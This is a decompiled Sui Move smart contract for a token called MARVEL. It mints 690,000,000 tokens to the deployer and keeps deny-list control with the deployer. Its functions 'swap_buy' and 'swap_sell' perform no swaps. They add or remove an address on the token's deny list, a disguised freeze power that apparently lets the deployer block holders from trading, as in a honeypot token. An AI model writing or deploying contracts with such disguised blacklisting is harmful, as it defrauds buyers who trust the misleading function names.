module 0x394c2ac98dd3acf00905a305a5b2107207b8c32783767eafecc302d4501d032f::marvel {
    struct MARVEL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MARVEL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MARVEL>(arg0, 9, b"MARVEL", b"MARVELOUS", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmUrSvvFdcpzENoFqYAM7GV4XyqUXa4HJy7Fj5uLKkUvJ8"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MARVEL>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MARVEL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MARVEL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MARVEL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MARVEL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MARVEL>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MARVEL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MARVEL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

